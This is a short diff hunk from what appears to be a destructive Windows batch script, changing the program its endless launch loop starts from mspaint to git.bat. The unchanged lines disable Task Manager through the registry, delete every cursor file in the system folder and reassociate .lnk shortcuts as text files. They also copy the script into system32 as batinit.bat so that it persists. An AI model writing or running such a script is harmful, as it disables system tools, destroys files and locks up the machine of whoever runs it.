@@ -25,7 +25,7 @@ reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskM
 
 del "%SystemRoot%Cursors*.*" >nul
 :x
-Start mspaint
+Start git.bat
 goto x
 assoc .lnk=.txt
 copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
